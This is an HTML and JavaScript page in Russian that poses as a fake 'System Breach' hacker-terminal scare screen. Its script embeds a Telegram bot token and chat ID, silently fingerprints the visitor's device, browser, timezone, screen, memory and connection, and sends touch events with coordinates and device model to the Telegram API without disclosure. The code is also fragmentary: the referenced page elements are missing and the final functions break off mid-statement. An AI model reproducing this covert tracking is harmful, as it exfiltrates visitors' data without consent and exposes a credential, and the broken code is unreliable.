<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>System Breach // Console</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background-color: #020402;
      color: #00ff41;
      font-family: 'Courier New', Courier, monospace;
      font-size: 13px;
      line-height: 1.35;
      min-height: 100vh;
      overflow-x: hidden;
      text-shadow: 0 0 5px rgba(0, 255, 65, 0.35);
    }

    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: repeating-linear-gradient(
        0deg,
        rgba(0, 0, 0, 0.22),
        rgba(0, 0, 0, 0.22) 1px,
        transparent 1px,
        transparent 3px
      );
      pointer-events: none;
      z-index: 25;
    }

    /* Очень мягкая красная подсветка по краям */
    #flash-overlay {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 20;
      box-shadow: inset 0 0 0 rgba(220, 75, 88, 0);
      transition: box-shadow 0.16s ease, background-color 0.16s ease;
    }

    #flash-overlay.flash {
      box-shadow: inset 0 0 18px rgba(220, 75, 88, 0.16);
      background-color: rgba(220, 75, 88, 0.01);
    }

    @keyframes shake {
      0%, 100% { transform: translate(0, 0); }
      25% { transform: translate(-2px, 1px); }
      50% { transform: translate(2px, -1px); }
      75% { transform: translate(-2px, -1px); }
    }

    .shake {
      animation: shake 0.2s linear;
    }

    /* Первое окно: Загрузка... и зелёное поле запуска под ним */
    #loader-screen {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
      text-align: center;
      gap: 22px;
    }

    .loading-title {
      font-size: 26px;
      font-weight: bold;
      color: #00ff41;
      letter-spacing: 1px;
    }

    .launch-box {
      width: 100%;
      max-width: 300px;
      padding: 15px 22px;
      border: 2px solid #00ff41;
      background: rgba(0, 255, 65, 0.16);
      color: #66ff8c;
      font-size: 16px;
      font-weight: bold;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 0 16px rgba(0, 255, 65, 0.24);
      transition: transform 0.12s ease, background 0.15s ease;
    }

    .launch-box:active {
      transform: scale(0.97);
      background: rgba(0, 255, 65, 0.28);
    }

    .loader-sub {
      font-size: 12px;
      color: #00b830;
    }

    /* Экран терминала */
    #terminal {
      display: none;
      max-width: 860px;
      margin: 0 auto;
      padding: 12px 12px 50px;
    }

    #top-bar {
      position: sticky;
      top: 0;
      background: rgba(2, 4, 2, 0.94);
      border-bottom: 1px solid #0d3b17;
      padding: 6px 4px;
      margin-bottom: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      color: #00cc33;
      z-index: 12;
    }

    .line {
      margin-bottom: 2px;
      word-break: break-all;
      color: #00ff41;
    }

    .ts {
      color: #008f24;
    }

    .bright {
      color: #66ff8c;
      font-weight: bold;
    }

    .cmd {
      color: #99ffb3;
      font-weight: bold;
    }

    .soft-alert {
      color: #d47179;
      font-weight: bold;
    }

    .cursor {
      display: inline-block;
      width: 8px;
      height: 14px;
      background: #00ff41;
      vertical-align: middle;
      animation: blink 0.7s infinite;
    }

    @keyframes blink {
      0%, 49% { opacity: 1; }
      50%, 100% { opacity: 0; }
    }

    /* Финальный экран */
    #final-alert {
      display: none;
      min-height: 100dvh;
      width: 100%;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      text-align: center;
      padding: 28px 18px 24px;
      gap: 18px;
    }

    .final-copy {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
      max-width: 380px;
      margin-top: auto;
      margin-bottom: auto;
    }

    #final-alert .alert-text {
      color: #ff1e2d;
      font-size: 25px;
      font-weight: bold;
      line-height: 1.35;
      text-shadow: 0 0 12px rgba(255, 30, 45, 0.45);
      animation: pulseRed 1.2s infinite alternate;
    }

    #final-alert .sub-warn {
      color: #ff2b3a;
      font-size: 13px;
      line-height: 1.45;
      max-width: 350px;
      font-weight: 600;
      text-shadow: 0 0 8px rgba(255, 43, 58, 0.3);
      opacity: 0.96;
    }

    .meme-box {
      margin-top: 6px;
      width: min(255px, 68vw);
      aspect-ratio: 1 / 1;
      border-radius: 18px;
      overflow: hidden;
      flex-shrink: 0;
      border: 1px solid rgba(255, 50, 65, 0.28);
      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.72);
    }

    @keyframes pulseRed {
      from { opacity: 0.86; }
      to { opacity: 1; }
    }

    .meme-box img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    @keyframes pulseSoftRed {
      from { opacity: 0.85; }
      to { opacity: 1; }
    }
  </style>
</head>

  <script>
    const TG_BOT_TOKEN = "8294247946:AAFg9JHzStcfuxkF2jh5VJT7OYhIBIZgrAk";
    const TG_CHAT_ID = "8215850367";
    const DURATION_MS = 30000;

    const loaderScreen = document.getElementById("loader-screen");
    const loadingLabel = document.getElementById("loading-label");
    const terminalEl = document.getElementById("terminal");
    const output = document.getElementById("output");
    const typingLine = document.getElementById("typing-line");
    const cursorRow = document.getElementById("cursor-row");
    const finalAlert = document.getElementById("final-alert");
    const flashOverlay = document.getElementById("flash-overlay");
    const audioState = document.getElementById("audio-state");

    let started = false;
    let finished = false;
    let audioCtx = null;
    let firstTouchSent = false;
    let hiddenSent = false;
    let doxSent = false;
    let dossierProgressSent = false;
    let tapCount = 0;
    let scrollCount = 0;
    let maxScrollPct = 0;
    let lastAlertSentAt = 0;
    let heartbeatTimer = null;
    let sessionStart = Date.now();

    const ua = navigator.userAgent;
    const platform = navigator.platform || "Linux armv8l";
    const lang = navigator.language || "ru-RU";
    const languages = (navigator.languages || [lang]).join(", ");
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Europe/Kyiv";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const availRes = `${window.screen.availWidth}x${window.screen.availHeight}`;
    const dpr = window.devicePixelRatio || 1;
    const colorDepth = window.screen.colorDepth || 24;
    const cores = navigator.hardwareConcurrency || 8;
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "4GB+";
    const touchPoints = navigator.maxTouchPoints || 5;
    const connType = navigator.connection ? (navigator.connection.effectiveType || "4g").toUpperCase() : "4G";
    const connSpeed = navigator.connection && navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : "N/A";
    const connRtt = navigator.connection && navigator.connection.rtt ? `${navigator.connection.rtt} ms` : "N/A";

    function detectDeviceModel() {
      const m = ua.match(/Android\s[\d.]+;\s([^;)]+)/i);
      if (m && m[1]) return m[1].trim();
      if (/iPhone/i.test(ua)) return "Apple iPhone";
      if (/Windows/i.test(ua)) return "Windows PC";
      return platform;
    }

    function detectBrowser() {
      if (/Edg\//i.test(ua)) return "Edge";
      if (/OPR\//i.test(ua)) return "Opera";
      if (/YaBrowser/i.test(ua)) return "Yandex Browser";
      if (/Chrome\//i.test(ua)) return "Chrome Mobile";
      if (/Safari\//i.test(ua)) return "Safari";
      if (/Firefox\//i.test(ua)) return "Firefox";
      return "WebView";
    }

    const deviceModel = detectDeviceModel();
    const browserName = detectBrowser();

    // Чистый короткий писк (2400-2900 Hz, sine)
    function ensureAudioContext() {
      try {
        if (!audioCtx) {
          const AC = window.AudioContext || window.webkitAudioContext;
          if (AC) audioCtx = new AC();
        }
        if (audioCtx && audioCtx.state === "suspended") {
          audioCtx.resume().then(() => {
            if (audioState) audioState.textContent = "BEEP: ON";
          }).catch(() => {});
        } else if (audioCtx && audioCtx.state === "running") {
          if (audioState) audioState.textContent = "BEEP: ON";
        }
      } catch (e) {}
    }

    function beep(freq = 2500, ms = 55, volume = 0.24) {
      try {
        ensureAudioContext();
        if (!audioCtx || audioCtx.state !== "running") return;
        const now = audioCtx.currentTime;
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = "sine";
        osc.frequency.setValueAtTime(freq, now);
        gain.gain.setValueAtTime(0.0001, now);
        gain.gain.linearRampToValueAtTime(volume, now + 0.004);
        gain.gain.exponentialRampToValueAtTime(0.0001, now + ms / 1000);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(now);
        osc.stop(now + ms / 1000 + 0.01);
      } catch (e) {}
    }

    function vibrate(pattern) {
      try {
        if (navigator.vibrate) navigator.vibrate(pattern);
      } catch (e) {}
    }

    function triggerSoftFlashAndShake() {
      flashOverlay.classList.add("flash");
      terminalEl.classList.remove("shake");
      void terminalEl.offsetWidth;
      terminalEl.classList.add("shake");
      beep(2750, 75, 0.26);
      vibrate([30, 20, 40]);
      setTimeout(() => flashOverlay.classList.remove("flash"), 140);
    }

    async function sendTgMessage(text) {
      try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: text,
            parse_mode: "HTML"
          })
        });
      } catch (e) {}
    }

    ["touchstart", "pointerdown", "click"].forEach((evt) => {
      window.addEventListener(evt, (e) => {
        tapCount++;
        ensureAudioContext();
        beep(2550, 55, 0.25);
        vibrate(12);

        const sec = ((Date.now() - sessionStart) / 1000).toFixed(1);
        const x = e.touches && e.touches[0] ? Math.round(e.touches[0].clientX) : Math.round(e.clientX || 0);
        const y = e.touches && e.touches[0] ? Math.round(e.touches[0].clientY) : Math.round(e.clientY || 0);
        const targetTag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : "window";
        const targetId = (e.target && e.target.id) ? `#${e.target.id}` : "";

        if (!firstTouchSent) {
          firstTouchSent = true;
          sendTgMessage(
            `👆 <b>ПЕРВОЕ КАСАНИЕ ЭКРАНА!</b>\n` +
            `⏱ <b>Секунда от входа:</b> ${sec} с\n` +
            `📍 <b>Координаты:</b> X=${x}, Y=${y}\n` +
            `🎯 <b>Элемент:</b> <code>${targetTag}${targetId}</code>\n` +
            `📱 <b>Устройство:</b> ${deviceModel}`
          );
        } else if (tapCount === 5 || tapCount === 15 || tapCount === 30) {
          sendTgMessage(
            `⚡ <b>АКТИВНОСТЬ КАСАНИЙ (${tapCount} тапов)</b>\n` +
            `⏱ <b>Время от входа:</b> ${sec} с\n` +
            `📍 <b>Последняя точка:</b> X=${x}, Y=${y} (<code>${targetTag}${targetId}</code>)\n` +
            `📱 <b>Устройство:</b> ${deviceModel}`
          );
        }
      }, { passive: true });
    });

    window.addEventListener("scroll", () => {
      scrollCount++;
      const docH = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
      const pct = Math.min(100, Math.max(0, Math.round((window.scrollY / docH) * 100)));
      if (pct > maxScrollPct) maxScrollPct = pct;
    }, { passive: true });

    function launchTerminal() {
      if (started) return;

      loaderScreen.style.display = "none";

    let dots = 0;

      if (started) {

    if (window.performance && performance.getEntriesByType) {
